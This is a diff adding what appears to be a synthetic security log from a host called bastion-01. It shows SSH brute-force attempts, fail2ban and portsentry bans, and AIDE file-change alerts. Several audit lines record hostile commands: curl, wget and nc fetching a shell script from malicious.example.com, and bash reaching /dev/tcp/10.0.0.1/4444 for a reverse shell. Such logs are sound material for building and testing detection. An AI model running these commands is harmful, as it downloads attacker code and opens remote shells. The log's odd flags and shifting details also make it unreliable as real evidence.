@@ -1,0 +1,406 @@
+Jun 15 10:00:04 bastion-01 systemd[1]: Started OpenBSD Secure Shell server.
+Jun 15 10:00:09 bastion-01 sshd[33141]: Server listening on 0.0.0.0 port 22.
+Jun 15 10:00:09 bastion-01 audit[60689]: type=EXECVE msg=audit(9.460:621): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://malicious.example.com/shell.sh"
+Jun 15 10:00:10 bastion-01 audit[13325]: type=ANOMALY_RESP msg=audit(9.245): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=140.87.216.251 terminal=ssh res=failed
+Jun 15 10:00:14 bastion-01 ntpd[1733]: adjusting local clock by 0.052071s
+Jun 15 10:00:17 bastion-01 audit[9420]: type=EXECVE msg=audit(14.846:638): argc=5 a0="/usr/bin/curl" a1="-e" a2="/dev/tcp/10.0.0.1/4444"
+Jun 15 10:00:20 bastion-01 audit[43583]: type=ANOMALY_RESP msg=audit(17.267): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=169.0.127.77 terminal=ssh res=failed
+Jun 15 10:00:25 bastion-01 sshd[5624]: Failed password for invalid user deploy from 140.87.216.251 port 43353 ssh2
+Jun 15 10:00:27 bastion-01 sshd[47821]: Failed password for deploy from 140.87.216.251 port 42624 ssh2
+Jun 15 10:00:28 bastion-01 sshd[40645]: Failed password for deploy from 140.87.216.251 port 63516 ssh2
+Jun 15 10:00:31 bastion-01 sshd[21732]: Failed password for invalid user deploy from 140.87.216.251 port 40059 ssh2
+Jun 15 10:00:33 bastion-01 sshd[6080]: Failed password for invalid user deploy from 140.87.216.251 port 46220 ssh2
+Jun 15 10:00:37 bastion-01 sshd[45825]: Failed password for invalid user deploy from 140.87.216.251 port 37208 ssh2
+Jun 15 10:00:37 bastion-01 sshd[42954]: Failed password for invalid user deploy from 140.87.216.251 port 51584 ssh2
+Jun 15 10:00:39 bastion-01 sshd[51991]: Failed password for invalid user deploy from 140.87.216.251 port 51857 ssh2
+Jun 15 10:00:40 bastion-01 sshd[57941]: error: maximum authentication attempts exceeded for deploy from 140.87.216.251 port 39589 ssh2 [preauth]
+Jun 15 10:00:40 bastion-01 fail2ban.actions[5483]: NOTICE [sshd] Ban 140.87.216.251
+Jun 15 10:00:44 bastion-01 sshd[12516]: Failed password for deploy from 32.152.186.248 port 38093 ssh2
+Jun 15 10:00:47 bastion-01 sshd[39589]: Failed password for deploy from 32.152.186.248 port 50090 ssh2
+Jun 15 10:00:51 bastion-01 sshd[46905]: Failed password for invalid user deploy from 32.152.186.248 port 52865 ssh2
+Jun 15 10:00:53 bastion-01 sshd[37145]: error: maximum authentication attempts exceeded for deploy from 32.152.186.248 port 48480 ssh2 [preauth]
+Jun 15 10:00:53 bastion-01 fail2ban.actions[2623]: NOTICE [sshd] Ban 32.152.186.248
+Jun 15 10:00:56 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:01:01 bastion-01 certbot: Certificate for domain api.example.com expires in 2 days!
+Jun 15 10:01:06 bastion-01 sshd[1622]: Accepted publickey for ops from 10.0.8.142 port 56388 ssh2: RSA SHA256:909e137af6a2a1976092a820f0d25142
+Jun 15 10:01:07 bastion-01 sshd[47741]: pam_unix(sshd:session): session opened for user ops(uid=1525) by (uid=0)
+Jun 15 10:01:09 bastion-01 sshd[64864]: Accepted publickey for ops from 10.0.2.97 port 47522 ssh2: RSA SHA256:3389880ddcfd1eebc713b5b9352fa2a3
+Jun 15 10:01:10 bastion-01 sshd[51956]: pam_unix(sshd:session): session opened for user ops(uid=1724) by (uid=0)
+Jun 15 10:01:14 bastion-01 sshd[31714]: Accepted publickey for admin from 10.0.6.181 port 41999 ssh2: RSA SHA256:cdae5f70dca27afc37d69f5a3e7568cc
+Jun 15 10:01:17 bastion-01 sshd[19076]: pam_unix(sshd:session): session opened for user admin(uid=1293) by (uid=0)
+Jun 15 10:01:19 bastion-01 sshd[48085]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=32.152.186.248
+Jun 15 10:01:19 bastion-01 sshd[42594]: Accepted publickey for admin from 10.0.1.243 port 56641 ssh2: RSA SHA256:49a044c5b1860f502e0462d82b741317
+Jun 15 10:01:20 bastion-01 sshd[48838]: pam_unix(sshd:session): session opened for user admin(uid=1078) by (uid=0)
+Jun 15 10:01:20 bastion-01 ntpd[838]: adjusting local clock by 0.075317s
+Jun 15 10:01:23 bastion-01 CRON[37317]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:01:26 bastion-01 systemd[1]: Started cron.service.
+Jun 15 10:01:31 bastion-01 sshd[35891]: Accepted publickey for admin from 10.0.2.123 port 63751 ssh2: RSA SHA256:722564aff4f079ff441241ade93e59e3
+Jun 15 10:01:31 bastion-01 sshd[27572]: pam_unix(sshd:session): session opened for user admin(uid=1127) by (uid=0)
+Jun 15 10:01:32 bastion-01 portsentry[7962]: attackalert: Connect from host: 66.17.43.251 to TCP port: 707
+Jun 15 10:01:37 bastion-01 portsentry[9652]: attackalert: Host 66.17.43.251 has been blocked via iptables
+Jun 15 10:01:42 bastion-01 portsentry[8350]: attackalert: Connect from host: 12.150.227.36 to TCP port: 346
+Jun 15 10:01:43 bastion-01 portsentry[9577]: attackalert: Host 12.150.227.36 has been blocked via iptables
+Jun 15 10:01:45 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:01:47 bastion-01 certbot: Certificate for domain api.example.com expires in 4 days!
+Jun 15 10:01:48 bastion-01 ntpd[1365]: adjusting local clock by -0.004492s
+Jun 15 10:01:52 bastion-01 sudo[23148]:   www-data : user NOT in sudoers ; TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Jun 15 10:01:54 bastion-01 systemd[1]: Started cron.service.
+Jun 15 10:01:55 bastion-01 kernel: [49953.758] [UFW BLOCK] IN=eth0 OUT= MAC=32b5c6438b36 SRC=140.87.216.251 DST=10.0.1.1 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=49391 DPT=8080 WINDOW=1024 SYN
+Jun 15 10:01:58 bastion-01 sshd[59551]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=66.17.43.251
+Jun 15 10:01:58 bastion-01 ntpd[1499]: adjusting local clock by -0.442503s
+Jun 15 10:01:58 bastion-01 portsentry[5888]: attackalert: Connect from host: 140.87.216.251 to TCP port: 725
+Jun 15 10:02:00 bastion-01 portsentry[1084]: attackalert: Host 140.87.216.251 has been blocked via iptables
+Jun 15 10:02:00 bastion-01 ntpd[881]: adjusting local clock by -0.097932s
+Jun 15 10:02:00 bastion-01 sshd[27916]: Failed password for test from 169.0.127.77 port 40073 ssh2
+Jun 15 10:02:05 bastion-01 sshd[11199]: Failed password for test from 169.0.127.77 port 30452 ssh2
+Jun 15 10:02:07 bastion-01 sshd[26910]: Failed password for invalid user test from 169.0.127.77 port 60847 ssh2
+Jun 15 10:02:10 bastion-01 sshd[24887]: error: maximum authentication attempts exceeded for test from 169.0.127.77 port 49613 ssh2 [preauth]
+Jun 15 10:02:14 bastion-01 fail2ban.actions[3984]: NOTICE [sshd] Ban 169.0.127.77
+Jun 15 10:02:17 bastion-01 systemd[1]: Started cron.service.
+Jun 15 10:02:22 bastion-01 sshd[58906]: Accepted publickey for deploy from 10.0.7.42 port 53182 ssh2: RSA SHA256:985c41bf4303186f4ec77c016df0f65b
+Jun 15 10:02:23 bastion-01 sshd[8252]: pam_unix(sshd:session): session opened for user deploy(uid=1203) by (uid=0)
+Jun 15 10:02:24 bastion-01 kernel: [97320.303] [UFW BLOCK] IN=eth0 OUT= MAC=93f70065ca6b SRC=32.152.186.248 DST=10.0.1.191 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=22730 DPT=22 WINDOW=1024 SYN
+Jun 15 10:02:24 bastion-01 ntpd[1862]: adjusting local clock by 0.482929s
+Jun 15 10:02:25 bastion-01 sudo[33477]:   daemon : user NOT in sudoers ; TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/id
+Jun 15 10:02:25 bastion-01 audit[51095]: type=EXECVE msg=audit(145.899:903): argc=5 a0="/usr/bin/nc" a1="-O" a2="http://malicious.example.com/shell.sh"
+Jun 15 10:02:26 bastion-01 audit[52951]: type=ANOMALY_RESP msg=audit(145.121): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=32.152.186.248 terminal=ssh res=failed
+Jun 15 10:02:30 bastion-01 audit[1894]: type=EXECVE msg=audit(146.885:701): argc=3 a0="/usr/bin/curl" a1="-e" a2="/dev/tcp/10.0.0.1/4444"
+Jun 15 10:02:33 bastion-01 audit[49328]: type=ANOMALY_RESP msg=audit(150.108): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=169.0.127.77 terminal=ssh res=failed
+Jun 15 10:02:34 bastion-01 kernel: [42698.387] [UFW BLOCK] IN=eth0 OUT= MAC=ef3f2615cac2 SRC=169.0.127.77 DST=10.0.1.110 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=17260 DPT=443 WINDOW=1024 SYN
+Jun 15 10:02:36 bastion-01 CRON[57634]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:02:39 bastion-01 ntpd[1006]: adjusting local clock by 0.166330s
+Jun 15 10:02:44 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:02:49 bastion-01 certbot: Certificate for domain api.example.com expires in 5 days!
+Jun 15 10:02:53 bastion-01 sshd[12874]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=32.152.186.248
+Jun 15 10:02:54 bastion-01 sshd[13594]: Accepted publickey for deploy from 10.0.2.59 port 38670 ssh2: RSA SHA256:517eba66e061d209c3cb1b4696c68afd
+Jun 15 10:02:58 bastion-01 sshd[2157]: pam_unix(sshd:session): session opened for user deploy(uid=1436) by (uid=0)
+Jun 15 10:02:58 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:03:02 bastion-01 certbot: Certificate for domain www.example.com expires in 3 days!
+Jun 15 10:03:06 bastion-01 audit[42504]: type=EXECVE msg=audit(182.336:228): argc=4 a0="/usr/bin/nc" a1="-c" a2="http://malicious.example.com/shell.sh"
+Jun 15 10:03:08 bastion-01 audit[28988]: type=ANOMALY_RESP msg=audit(186.759): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=66.17.43.251 terminal=ssh res=failed
+Jun 15 10:03:08 bastion-01 sshd[21961]: Failed password for oracle from 140.87.216.251 port 46185 ssh2
+Jun 15 10:03:13 bastion-01 sshd[4416]: Failed password for invalid user oracle from 140.87.216.251 port 30035 ssh2
+Jun 15 10:03:16 bastion-01 sshd[19698]: Failed password for oracle from 140.87.216.251 port 43892 ssh2
+Jun 15 10:03:17 bastion-01 sshd[29239]: Failed password for invalid user oracle from 140.87.216.251 port 36603 ssh2
+Jun 15 10:03:19 bastion-01 sshd[24827]: Failed password for invalid user oracle from 140.87.216.251 port 62196 ssh2
+Jun 15 10:03:19 bastion-01 sshd[8309]: error: maximum authentication attempts exceeded for oracle from 140.87.216.251 port 49946 ssh2 [preauth]
+Jun 15 10:03:24 bastion-01 fail2ban.actions[1223]: NOTICE [sshd] Ban 140.87.216.251
+Jun 15 10:03:26 bastion-01 sshd[57490]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=32.152.186.248
+Jun 15 10:03:30 bastion-01 audit[54086]: type=EXECVE msg=audit(206.470:761): argc=4 a0="/usr/bin/wget" a1="-e" a2="http://malicious.example.com/shell.sh"
+Jun 15 10:03:31 bastion-01 audit[26169]: type=ANOMALY_RESP msg=audit(210.189): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=66.17.43.251 terminal=ssh res=failed
+Jun 15 10:03:31 bastion-01 sshd[7464]: Accepted publickey for deploy from 10.0.9.31 port 42480 ssh2: RSA SHA256:74b26331f49964b43cf81d72309cedec
+Jun 15 10:03:35 bastion-01 sshd[36820]: pam_unix(sshd:session): session opened for user deploy(uid=1964) by (uid=0)
+Jun 15 10:03:36 bastion-01 audit[48536]: type=EXECVE msg=audit(215.585:780): argc=3 a0="/usr/bin/wget" a1="-s" a2="http://malicious.example.com/shell.sh"
+Jun 15 10:03:40 bastion-01 audit[28407]: type=ANOMALY_RESP msg=audit(216.663): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=140.87.216.251 terminal=ssh res=failed
+Jun 15 10:03:45 bastion-01 ntpd[1249]: adjusting local clock by -0.051518s
+Jun 15 10:03:45 bastion-01 sshd[52831]: Failed password for invalid user admin from 169.0.127.77 port 63021 ssh2
+Jun 15 10:03:46 bastion-01 sshd[46659]: Failed password for invalid user admin from 169.0.127.77 port 47966 ssh2
+Jun 15 10:03:51 bastion-01 sshd[53061]: Failed password for invalid user admin from 169.0.127.77 port 33984 ssh2
+Jun 15 10:03:56 bastion-01 sshd[33442]: Failed password for invalid user admin from 169.0.127.77 port 56050 ssh2
+Jun 15 10:03:56 bastion-01 sshd[64670]: Failed password for admin from 169.0.127.77 port 63651 ssh2
+Jun 15 10:04:00 bastion-01 sshd[26175]: Failed password for invalid user admin from 169.0.127.77 port 63376 ssh2
+Jun 15 10:04:04 bastion-01 sshd[27270]: error: maximum authentication attempts exceeded for admin from 169.0.127.77 port 55575 ssh2 [preauth]
+Jun 15 10:04:05 bastion-01 fail2ban.actions[5448]: NOTICE [sshd] Ban 169.0.127.77
+Jun 15 10:04:06 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:04:10 bastion-01 certbot: Certificate for domain auth.example.com expires in 1 days!
+Jun 15 10:04:15 bastion-01 sshd[20422]: Accepted publickey for ops from 10.0.8.117 port 64411 ssh2: RSA SHA256:5cfc4242f649ac4d8ece3bda2df66738
+Jun 15 10:04:15 bastion-01 sshd[37185]: pam_unix(sshd:session): session opened for user ops(uid=1274) by (uid=0)
+Jun 15 10:04:15 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:04:17 bastion-01 certbot: Certificate for domain auth.example.com expires in 1 days!
+Jun 15 10:04:18 bastion-01 sshd[43101]: Failed password for invalid user oracle from 32.152.186.248 port 33376 ssh2
+Jun 15 10:04:18 bastion-01 sshd[36035]: Failed password for oracle from 32.152.186.248 port 43760 ssh2
+Jun 15 10:04:22 bastion-01 sshd[42463]: Failed password for invalid user oracle from 32.152.186.248 port 52771 ssh2
+Jun 15 10:04:27 bastion-01 sshd[6455]: Failed password for oracle from 32.152.186.248 port 51270 ssh2
+Jun 15 10:04:28 bastion-01 sshd[48322]: error: maximum authentication attempts exceeded for oracle from 32.152.186.248 port 47304 ssh2 [preauth]
+Jun 15 10:04:32 bastion-01 fail2ban.actions[7690]: NOTICE [sshd] Ban 32.152.186.248
+Jun 15 10:04:33 bastion-01 kernel: [46659.280] [UFW BLOCK] IN=eth0 OUT= MAC=5d9b3ea0e0d0 SRC=66.17.43.251 DST=10.0.1.3 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=55021 DPT=6379 WINDOW=1024 SYN
+Jun 15 10:04:36 bastion-01 kernel: [95698.363] [UFW BLOCK] IN=eth0 OUT= MAC=2d4e928945a8 SRC=66.17.43.251 DST=10.0.1.251 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=57908 DPT=80 WINDOW=1024 SYN
+Jun 15 10:04:40 bastion-01 systemd[1]: Started apt-daily.service.
+Jun 15 10:04:41 bastion-01 sshd[54532]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=169.0.127.77
+Jun 15 10:04:46 bastion-01 audit[14364]: type=EXECVE msg=audit(281.695:645): argc=5 a0="/usr/bin/wget" a1="-c" a2="http://malicious.example.com/shell.sh"
+Jun 15 10:04:47 bastion-01 audit[48597]: type=ANOMALY_RESP msg=audit(286.544): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=140.87.216.251 terminal=ssh res=failed
+Jun 15 10:04:50 bastion-01 ntpd[691]: adjusting local clock by -0.004039s
+Jun 15 10:04:51 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:04:54 bastion-01 certbot: Certificate for domain api.example.com expires in 4 days!
+Jun 15 10:04:54 bastion-01 ntpd[869]: adjusting local clock by 0.147564s
+Jun 15 10:04:54 bastion-01 audit[59015]: type=EXECVE msg=audit(294.281:838): argc=5 a0="/usr/bin/wget" a1="-s" a2="http://malicious.example.com/shell.sh"
+Jun 15 10:04:59 bastion-01 audit[28944]: type=ANOMALY_RESP msg=audit(294.351): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=169.0.127.77 terminal=ssh res=failed
+Jun 15 10:05:00 bastion-01 ntpd[705]: adjusting local clock by 0.224307s
+Jun 15 10:05:00 bastion-01 CRON[53952]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:05:00 bastion-01 portsentry[7291]: attackalert: Connect from host: 169.0.127.77 to TCP port: 43
+Jun 15 10:05:05 bastion-01 portsentry[1222]: attackalert: Host 169.0.127.77 has been blocked via iptables
+Jun 15 10:05:05 bastion-01 ntpd[770]: adjusting local clock by -0.251657s
+Jun 15 10:05:07 bastion-01 kernel: [21136.307] [UFW BLOCK] IN=eth0 OUT= MAC=64887403daca SRC=12.150.227.36 DST=10.0.1.248 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=1639 DPT=80 WINDOW=1024 SYN
+Jun 15 10:05:08 bastion-01 sshd[11126]: Failed password for invalid user git from 12.150.227.36 port 61385 ssh2
+Jun 15 10:05:12 bastion-01 sshd[42122]: Failed password for invalid user git from 12.150.227.36 port 47528 ssh2
+Jun 15 10:05:16 bastion-01 sshd[7738]: Failed password for invalid user git from 12.150.227.36 port 32918 ssh2
+Jun 15 10:05:19 bastion-01 sshd[59094]: Failed password for invalid user git from 12.150.227.36 port 63524 ssh2
+Jun 15 10:05:20 bastion-01 sshd[1079]: error: maximum authentication attempts exceeded for git from 12.150.227.36 port 39295 ssh2 [preauth]
+Jun 15 10:05:21 bastion-01 fail2ban.actions[1393]: NOTICE [sshd] Ban 12.150.227.36
+Jun 15 10:05:22 bastion-01 sudo[24154]:   www-data : user NOT in sudoers ; TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh
+Jun 15 10:05:27 bastion-01 ntpd[1901]: adjusting local clock by -0.115256s
+Jun 15 10:05:30 bastion-01 systemd[1]: Started cron.service.
+Jun 15 10:05:30 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:05:32 bastion-01 certbot: Certificate for domain api.example.com expires in 0 days!
+Jun 15 10:05:33 bastion-01 audit[41350]: type=EXECVE msg=audit(332.441:122): argc=4 a0="/usr/bin/curl" a1="-s" a2="base64 -d"
+Jun 15 10:05:35 bastion-01 audit[12669]: type=ANOMALY_RESP msg=audit(333.538): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=12.150.227.36 terminal=ssh res=failed
+Jun 15 10:05:39 bastion-01 portsentry[3461]: attackalert: Connect from host: 169.0.127.77 to TCP port: 618
+Jun 15 10:05:41 bastion-01 portsentry[5702]: attackalert: Host 169.0.127.77 has been blocked via iptables
+Jun 15 10:05:44 bastion-01 systemd[1]: Started logrotate.service.
+Jun 15 10:05:49 bastion-01 sshd[10741]: Accepted publickey for ops from 10.0.4.208 port 35004 ssh2: RSA SHA256:a879f2c990c98e00764999dc784fdfee
+Jun 15 10:05:50 bastion-01 sshd[21988]: pam_unix(sshd:session): session opened for user ops(uid=1150) by (uid=0)
+Jun 15 10:05:50 bastion-01 sudo[53222]:   daemon : user NOT in sudoers ; TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Jun 15 10:05:52 bastion-01 portsentry[3370]: attackalert: Connect from host: 140.87.216.251 to TCP port: 186
+Jun 15 10:05:53 bastion-01 portsentry[3089]: attackalert: Host 140.87.216.251 has been blocked via iptables
+Jun 15 10:05:55 bastion-01 CRON[24108]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:06:00 bastion-01 aide[8885]: AIDE found differences between database and filesystem!!
+Jun 15 10:06:05 bastion-01 aide[7782]: changed: /etc/crontab
+Jun 15 10:06:08 bastion-01 audit[53569]: type=EXECVE msg=audit(365.769:944): argc=3 a0="/usr/bin/nc" a1="-c" a2="base64 -d"
+Jun 15 10:06:12 bastion-01 audit[36307]: type=ANOMALY_RESP msg=audit(368.646): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=169.0.127.77 terminal=ssh res=failed
+Jun 15 10:06:12 bastion-01 sshd[16080]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=169.0.127.77
+Jun 15 10:06:17 bastion-01 portsentry[9633]: attackalert: Connect from host: 169.0.127.77 to TCP port: 450
+Jun 15 10:06:18 bastion-01 portsentry[2429]: attackalert: Host 169.0.127.77 has been blocked via iptables
+Jun 15 10:06:18 bastion-01 audit[14322]: type=EXECVE msg=audit(378.971:18): argc=4 a0="/usr/bin/nc" a1="-O" a2="http://malicious.example.com/shell.sh"
+Jun 15 10:06:19 bastion-01 audit[60727]: type=ANOMALY_RESP msg=audit(378.457): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=140.87.216.251 terminal=ssh res=failed
+Jun 15 10:06:20 bastion-01 kernel: [37621.947] [UFW BLOCK] IN=eth0 OUT= MAC=cf18d3d572da SRC=32.152.186.248 DST=10.0.1.142 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=64713 DPT=8080 WINDOW=1024 SYN
+Jun 15 10:06:23 bastion-01 kernel: [13453.812] [UFW BLOCK] IN=eth0 OUT= MAC=652a031e49f6 SRC=32.152.186.248 DST=10.0.1.179 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=47158 DPT=443 WINDOW=1024 SYN
+Jun 15 10:06:23 bastion-01 ntpd[1261]: adjusting local clock by -0.445917s
+Jun 15 10:06:24 bastion-01 sshd[6176]: Accepted publickey for ops from 10.0.1.123 port 40366 ssh2: RSA SHA256:8b40ba076c5d9a253ba5805d0fc32a24
+Jun 15 10:06:28 bastion-01 sshd[1817]: pam_unix(sshd:session): session opened for user ops(uid=1078) by (uid=0)
+Jun 15 10:06:29 bastion-01 systemd[1]: Started logrotate.service.
+Jun 15 10:06:34 bastion-01 CRON[31786]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:06:39 bastion-01 sshd[30096]: Failed password for invalid user oracle from 12.150.227.36 port 52107 ssh2
+Jun 15 10:06:40 bastion-01 sshd[8291]: Failed password for oracle from 12.150.227.36 port 48793 ssh2
+Jun 15 10:06:41 bastion-01 sshd[40595]: Failed password for invalid user oracle from 12.150.227.36 port 32104 ssh2
+Jun 15 10:06:44 bastion-01 sshd[26977]: Failed password for oracle from 12.150.227.36 port 30712 ssh2
+Jun 15 10:06:49 bastion-01 sshd[37317]: Failed password for oracle from 12.150.227.36 port 59772 ssh2
+Jun 15 10:06:54 bastion-01 sshd[21056]: Failed password for oracle from 12.150.227.36 port 62890 ssh2
+Jun 15 10:06:55 bastion-01 sshd[28765]: error: maximum authentication attempts exceeded for oracle from 12.150.227.36 port 44897 ssh2 [preauth]
+Jun 15 10:06:55 bastion-01 fail2ban.actions[5453]: NOTICE [sshd] Ban 12.150.227.36
+Jun 15 10:07:00 bastion-01 sshd[63329]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=32.152.186.248
+Jun 15 10:07:04 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:07:07 bastion-01 certbot: Certificate for domain api.example.com expires in 1 days!
+Jun 15 10:07:12 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:07:12 bastion-01 certbot: Certificate for domain auth.example.com expires in 4 days!
+Jun 15 10:07:15 bastion-01 systemd[1]: Started logrotate.service.
+Jun 15 10:07:20 bastion-01 audit[43066]: type=EXECVE msg=audit(435.514:848): argc=5 a0="/usr/bin/wget" a1="-s" a2="/dev/tcp/10.0.0.1/4444"
+Jun 15 10:07:20 bastion-01 audit[28801]: type=ANOMALY_RESP msg=audit(440.299): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=140.87.216.251 terminal=ssh res=failed
+Jun 15 10:07:20 bastion-01 sshd[36492]: Failed password for invalid user postgres from 140.87.216.251 port 40666 ssh2
+Jun 15 10:07:22 bastion-01 sshd[50579]: Failed password for invalid user postgres from 140.87.216.251 port 30719 ssh2
+Jun 15 10:07:22 bastion-01 sshd[42837]: Failed password for invalid user postgres from 140.87.216.251 port 43220 ssh2
+Jun 15 10:07:22 bastion-01 sshd[18640]: error: maximum authentication attempts exceeded for postgres from 140.87.216.251 port 45750 ssh2 [preauth]
+Jun 15 10:07:26 bastion-01 fail2ban.actions[1735]: NOTICE [sshd] Ban 140.87.216.251
+Jun 15 10:07:28 bastion-01 ntpd[1490]: adjusting local clock by -0.454319s
+Jun 15 10:07:29 bastion-01 sshd[33782]: Failed password for root from 140.87.216.251 port 56092 ssh2
+Jun 15 10:07:31 bastion-01 sshd[48558]: Failed password for invalid user root from 140.87.216.251 port 55601 ssh2
+Jun 15 10:07:34 bastion-01 sshd[22713]: Failed password for root from 140.87.216.251 port 36381 ssh2
+Jun 15 10:07:38 bastion-01 sshd[7619]: Failed password for root from 140.87.216.251 port 63002 ssh2
+Jun 15 10:07:42 bastion-01 sshd[2552]: Failed password for root from 140.87.216.251 port 39842 ssh2
+Jun 15 10:07:46 bastion-01 sshd[32257]: error: maximum authentication attempts exceeded for root from 140.87.216.251 port 55042 ssh2 [preauth]
+Jun 15 10:07:48 bastion-01 fail2ban.actions[1612]: NOTICE [sshd] Ban 140.87.216.251
+Jun 15 10:07:53 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:07:58 bastion-01 certbot: Certificate for domain www.example.com expires in 0 days!
+Jun 15 10:08:02 bastion-01 sshd[64154]: Failed password for test from 32.152.186.248 port 40554 ssh2
+Jun 15 10:08:04 bastion-01 sshd[61963]: Failed password for test from 32.152.186.248 port 64294 ssh2
+Jun 15 10:08:06 bastion-01 sshd[23218]: Failed password for invalid user test from 32.152.186.248 port 38598 ssh2
+Jun 15 10:08:11 bastion-01 sshd[3622]: Failed password for invalid user test from 32.152.186.248 port 58239 ssh2
+Jun 15 10:08:12 bastion-01 sshd[16670]: Failed password for test from 32.152.186.248 port 55403 ssh2
+Jun 15 10:08:13 bastion-01 sshd[63784]: Failed password for test from 32.152.186.248 port 34915 ssh2
+Jun 15 10:08:13 bastion-01 sshd[7383]: Failed password for test from 32.152.186.248 port 62605 ssh2
+Jun 15 10:08:13 bastion-01 sshd[36857]: Failed password for invalid user test from 32.152.186.248 port 50286 ssh2
+Jun 15 10:08:16 bastion-01 sshd[7167]: error: maximum authentication attempts exceeded for test from 32.152.186.248 port 62696 ssh2 [preauth]
+Jun 15 10:08:17 bastion-01 fail2ban.actions[6139]: NOTICE [sshd] Ban 32.152.186.248
+Jun 15 10:08:21 bastion-01 ntpd[830]: adjusting local clock by -0.431838s
+Jun 15 10:08:24 bastion-01 audit[6847]: type=EXECVE msg=audit(501.172:184): argc=5 a0="/bin/bash" a1="-c" a2="/dev/tcp/10.0.0.1/4444"
+Jun 15 10:08:28 bastion-01 audit[43617]: type=ANOMALY_RESP msg=audit(504.243): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=66.17.43.251 terminal=ssh res=failed
+Jun 15 10:08:30 bastion-01 aide[6955]: AIDE found differences between database and filesystem!!
+Jun 15 10:08:34 bastion-01 aide[7568]: changed: /etc/ssh/sshd_config
+Jun 15 10:08:38 bastion-01 ntpd[764]: adjusting local clock by -0.059172s
+Jun 15 10:08:40 bastion-01 systemd[1]: Started logrotate.service.
+Jun 15 10:08:45 bastion-01 sshd[41672]: Failed password for git from 169.0.127.77 port 32796 ssh2
+Jun 15 10:08:49 bastion-01 sshd[46858]: Failed password for invalid user git from 169.0.127.77 port 46044 ssh2
+Jun 15 10:08:52 bastion-01 sshd[20048]: Failed password for invalid user git from 169.0.127.77 port 36900 ssh2
+Jun 15 10:08:52 bastion-01 sshd[56956]: Failed password for invalid user git from 169.0.127.77 port 56167 ssh2
+Jun 15 10:08:52 bastion-01 sshd[44853]: Failed password for invalid user git from 169.0.127.77 port 60295 ssh2
+Jun 15 10:08:55 bastion-01 sshd[31531]: error: maximum authentication attempts exceeded for git from 169.0.127.77 port 52867 ssh2 [preauth]
+Jun 15 10:08:58 bastion-01 fail2ban.actions[9767]: NOTICE [sshd] Ban 169.0.127.77
+Jun 15 10:09:00 bastion-01 sshd[27314]: Failed password for admin from 32.152.186.248 port 43072 ssh2
+Jun 15 10:09:03 bastion-01 sshd[40607]: Failed password for invalid user admin from 32.152.186.248 port 52441 ssh2
+Jun 15 10:09:05 bastion-01 sshd[8492]: Failed password for invalid user admin from 32.152.186.248 port 61209 ssh2
